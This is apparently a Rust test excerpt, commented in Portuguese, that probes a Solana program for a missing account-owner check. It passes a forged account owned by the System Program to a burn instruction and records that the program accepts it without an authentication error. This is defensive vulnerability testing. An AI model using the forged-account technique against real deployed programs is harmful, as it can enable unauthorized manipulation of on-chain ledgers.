// Conta legitima do programa: supply=1000, balance=500 nos offsets 40 e 48
let mut legit_data = vec![0u8; 64];
legit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let legit_key = Pubkey::new_unique();
let legit_account = account(&program_id, &legit_data, None);

// Instrucao burn: discriminador IX_BURN=1 + amount u64 LE
let amount: u64 = 100;
let mut ix_data = vec![1u8];
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: uso legitimo com a conta do programa
let metas = vec![AccountMeta::new(legit_key, false)];
let ix = env.raw_ix(&ix_data, metas);
let contas = vec![(legit_key, legit_account)];
let _r = env.baseline("burn legitimo", &ix, &contas);

// Ataque: conta forjada com dono = System Program (diferente do program_id)
// O programa le supply/balance dela e tenta gravar de volta nela.
// O runtime bloqueia a gravacao (ExternalAccountDataModified), mas o programa
// aceitou a entrada sem checar o dono, o que e a falha de autenticacao.
let mut forged_data = vec![0u8; 64];
forged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let forged_key = Pubkey::new_unique();
let forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);

let metas_attack = vec![AccountMeta::new(forged_key, false)];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let contas_attack = vec![(forged_key, forged_account)];
let r_attack = env.attack("burn com conta forjada de outro dono", &ix_attack, &contas_attack);

// Dano: o programa aceitou a conta forjada (nao rejeitou por dono) e tentou
// gravar nela. O runtime barrou a gravacao, mas a conta forjada permanece
// com os dados originais e o programa nao retornou erro de autenticacao.
if r_attack.program_result != ProgramResult::Success {
    let after_forged = after(&r_attack, &forged_key);
    let supply = read_u64(after_forged.data(), 40);
    let balance = read_u64(after_forged.data(), 48);
    env.effect("conta forjada de outro dono foi aceita como ledger sem checagem de owner", supply == 1000 && balance == 500);
}
